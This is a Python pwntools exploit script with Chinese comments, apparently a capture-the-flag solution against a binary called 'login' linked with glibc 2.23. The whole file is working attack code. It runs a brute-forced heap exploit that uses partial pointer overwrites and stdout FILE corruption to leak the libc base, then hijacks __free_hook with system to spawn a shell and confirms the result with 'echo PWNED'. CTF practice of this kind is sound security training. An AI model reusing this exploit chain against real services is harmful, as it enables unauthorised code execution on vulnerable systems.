from pwn import *
import signal

elf = ELF('./login')
libc = ELF('./libc-2.23.so')

context(arch=elf.arch, os=elf.os, log_level='info')
context.timeout = 1

# ================= 超时处理 =================

class TimeoutException(Exception):
    pass

def timeout_handler(signum, frame):
    raise TimeoutException("try timeout")

signal.signal(signal.SIGALRM, timeout_handler)

# ================= 交互函数 =================

def register(index, size, passwd):
    p.sendafter(b"choice:", b"2\n")
    p.sendlineafter(b"id:", str(index).encode())
    p.sendlineafter(b"length:", str(size).encode())
    p.sendafter(b'password:', passwd)

def delete(index):
    p.sendafter(b"choice:", b"3\n")
    p.sendlineafter(b"id:", str(index).encode())

def edit_chunk(index, content):
    p.sendafter(b"choice:", b"4\n")
    p.sendlineafter(b"id:", str(index).encode())
    p.sendafter(b"pass:", content)

def login(index, size, passwd):
    p.sendafter(b"choice:", b"1\n")
    p.sendlineafter(b"id:", str(index).encode())
    p.sendlineafter(b"length:", str(size).encode())
    p.sendafter(b"password:", passwd)

# ================= 爆破循环 =================

cnt = 0

while True:
    cnt += 1
    log.info(f"try times: {cnt}")

    p = process([elf.path])
    # p = remote('127.0.0.1', 10000)

    try:
        # 每轮最多跑 5 秒
        # 如果机器比较慢，可以改成 8 或 10
        signal.alarm(5)

        register(9, 8, b'a')
        register(0, 104, b'a')      # 0x68
        register(1, 152, b'a')      # 0x98
        register(2, 104, b'a')      # 0x68

        delete(1)
        delete(9)

        register(8, 24, b'a')       # 0x18
        edit_chunk(8, p16(0x21a0))  # heap partial overwrite

        register(3, 40, b'a')       # 0x28
        register(4, 104, p16(0x55dd))  # stdout partial overwrite

        delete(0)
        delete(2)

        edit_chunk(9, p16(0x2100))  # heap partial overwrite

        register(5, 104, b'/bin/sh\x00')
        register(6, 104, b'a')

        payload  = b'\x00' * 0x33
        payload += p32(0xfbad1880)
        payload += b";sh;"
        payload += p64(0) * 3
        payload += p8(0x88)

        register(7, 104, payload)

        # ================= 泄露 libc =================
        # 这里必须加 timeout，否则失败时可能一直卡住
        data = p.recvuntil(b'\x7f', timeout=1)

        if not data or b'\x7f' not in data:
            raise Exception("leak failed")

        libc.address = u64(data[-6:].ljust(8, b'\x00')) - 0x3c48e0

        # libc base 应该页对齐
        if libc.address & 0xfff != 0:
            raise Exception("bad libc base")

        log.success("libc: " + hex(libc.address))

        # ================= 劫持 __free_hook =================

        edit_chunk(8, p64(libc.symbols['__free_hook']))
        edit_chunk(9, p64(libc.symbols['system']))

        delete(5)

        # ================= 检查是不是真的拿到 shell =================
        # 不能直接 interactive，否则没拿到 shell 时会卡在菜单里
        p.sendline(b'echo PWNED')
        res = p.recvuntil(b'PWNED', timeout=1)

        if b'PWNED' not in res:
            raise Exception("not shell")

        # 成功后关闭 alarm，否则 interactive 时会被 alarm 打断
        signal.alarm(0)

        log.success("get shell")
        p.interactive()
        break

    except KeyboardInterrupt:
        signal.alarm(0)
        p.close()
        break

    except TimeoutException:
        signal.alarm(0)
        log.warning("timeout, retry")
        p.close()
        continue

    except EOFError:
        signal.alarm(0)
        log.warning("process crashed, retry")
        p.close()
        continue

    except Exception as e:
        signal.alarm(0)
        log.warning(str(e))
        p.close()
        continue